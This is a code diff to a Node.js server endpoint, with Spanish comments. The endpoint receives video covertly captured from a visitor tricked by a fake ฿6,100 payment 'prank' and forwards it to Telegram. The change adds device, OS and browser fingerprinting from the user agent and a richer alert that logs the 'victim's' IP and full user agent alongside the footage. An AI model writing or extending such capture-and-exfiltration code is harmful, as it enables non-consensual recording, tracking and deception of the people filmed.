@@ -92,17 +92,42 @@ module.exports = async (req, res) => {
     const videoBuffer = require('fs').readFileSync(videoFile.filepath);
     const fileSize = (videoFile.size / 1024 / 1024).toFixed(2); // MB
 
-    // Crear mensaje para Telegram
-    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b>
-    
-📱 <b>IP Víctima:</b> <code>${ip}</code>
-🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip}.webm</code>
-📊 <b>Tamaño:</b> ${fileSize} MB
-⏰ <b>Hora captura:</b> ${timestamp}
-🌐 <b>Dispositivo:</b> ${userAgent.substring(0, 80)}...
+    // Analizar User Agent para detalles
+    let deviceType = 'Unknown';
+    let os = 'Unknown';
+    let browser = 'Unknown';
 
-🎭 <b>¡La broma fue un éxito!</b>
-💰 <b>Creyó que pagaste:</b> ฿6,100.00`;
+    if (userAgent.includes('Mobile') || userAgent.includes('Android')) deviceType = '📱 Móvil';
+    else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) deviceType = '📱 Tablet';
+    else deviceType = '💻 Desktop';
+
+    if (userAgent.includes('Windows')) os = 'Windows';
+    else if (userAgent.includes('Mac')) os = 'macOS';
+    else if (userAgent.includes('Linux')) os = 'Linux';
+    else if (userAgent.includes('Android')) os = 'Android';
+    else if (userAgent.includes('iOS')) os = 'iOS';
+
+    if (userAgent.includes('Chrome')) browser = 'Chrome';
+    else if (userAgent.includes('Firefox')) browser = 'Firefox';
+    else if (userAgent.includes('Safari')) browser = 'Safari';
+    else if (userAgent.includes('Edge')) browser = 'Edge';
+
+    // Crear mensaje completo para Telegram
+    const message = `🎉 <b>¡VIDEO CAPTURADO CON ÉXITO!</b>
+
+📍 <b>IP VÍCTIMA:</b> <code>${ip}</code>
+🎥 <b>Archivo:</b> <code>video_${Date.now()}_${ip.replace(/[:.]/g, '-')}.webm</code>
+📊 <b>Tamaño:</b> ${fileSize} MB
+⏰ <b>Hora:</b> ${timestamp}
+
+${deviceType} <b>Dispositivo:</b> ${os}
+🌐 <b>Navegador:</b> ${browser}
+📱 <b>User Agent completo:</b>
+<code>${userAgent}</code>
+
+🎭 <b>¡BROMA EXITOSA!</b>
+💰 <b>Víctima creyó que pagaste:</b> ฿6,100.00
+🎬 <b>Video adjunto abajo ⬇️</b>`;
 
     // Enviar a Telegram
     await sendVideoToTelegram(videoBuffer, message, ip);
